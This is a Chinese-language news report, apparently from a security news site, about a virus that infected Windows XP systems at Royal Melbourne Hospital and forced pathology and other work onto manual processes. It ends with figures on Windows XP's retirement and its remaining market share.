+澳大利亚皇家墨尔本医院Windows XP系统被一种病毒感染，导致医院陷入瘫痪，不仅很多医疗诊断工作采用人工方法处理，就连病人信息也受影响。目前医院仍致力于解决了这一“杂症”。
+医疗系统感染病毒
+Melbourne Health（墨尔本医疗）是医院的管理系统，而这场战争从上周五下午就开始了。病毒利用周末在医院系统肆虐，IT工作人员和安全顾问一直日以继夜地努力处理隔离问题。 
+本周一，医院工作人员收到一封邮件称，病毒攻击了Melbourne Health系统的病理科，造成了员工需要手动提取如血液、组织、尿液等样本，而计算机无法辅助进行登记、检测以及显示结果。
+而为重症监护病房和急诊科提供血液科及生化检测结果的工作人员则采用电话的方式联系。如果有紧急病理样本需要进行处理，工作人员则要通过传真的方式。
+此外，医院的送餐系统也受到影响。
+=700) window.open('http://image.3001.net/images/20160121/14533463554754.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+而院方表示：
+“IT人员正在紧急处理这个病毒。解决问题是需要时间的，不建议工作人员尝试自行修复问题。”同时，院方警告医院工作人员将电脑关闭，并且不要进行银行、Gmail或者Facebook的登录。医院发言人并未就病毒是如何感染的进行解释，也不清楚解决这个问题还需要多长时间，医院系统才能恢复正常。
+
+Windows XP退役一年有余
+2014年4月8日，服役13年的微软Windows XP系统正式“退休”。尽管系统仍可以继续使用，但微软不再提供官方服务支持。同年10月份的数据显示，Windows XP的市场份额较9月大幅下滑6.7%至17.2%。
+有统计数据显示，目前在澳大利亚Windows XP在桌面系统中的份额已经微乎其微，只剩下2.23％，远不如Windows 10、8.1、7和Mac OS X，而在国内，Windows XP依然高达26.31％。
+现在，你还在用XP系统吗？
+*参考来源：theage、zdnet
+
+
+
+
+
+
+
